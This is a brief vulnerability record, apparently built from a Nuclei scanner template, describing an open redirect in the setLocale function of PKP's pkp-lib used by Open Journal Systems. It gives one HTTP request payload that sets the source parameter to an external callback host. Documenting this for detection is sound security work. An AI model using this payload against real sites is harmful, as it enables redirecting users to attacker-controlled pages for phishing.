# Vulnerability: Open Journal Systems pkp-lib - Open Redirect
**Classification:** PKP
**Source:** Nuclei Template (`pkp-lib-open-redirect.yaml`)

## Description
Public Knowledge Project pkp-lib is vulnerable to Open redirect due to a lack of input sanitization in the setLocale function.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php/index/user/setLocale/NEW_LOCALE?source=@oast.me
```

